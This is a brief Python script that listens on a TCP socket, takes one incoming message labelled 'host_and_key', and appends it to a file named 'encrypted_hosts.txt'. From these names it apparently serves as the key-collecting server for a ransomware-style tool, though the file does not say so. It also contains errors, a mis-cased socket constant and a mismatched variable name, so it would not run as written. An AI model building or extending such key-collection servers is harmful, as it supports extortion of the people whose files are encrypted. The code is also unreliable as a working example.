import socket


IP_ADDRESS = '192.168.137.1'
PORT = 5678

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.Sock_stream) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connection...')
    s.listen(1)
    conn, adde = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Completed and closed!')
            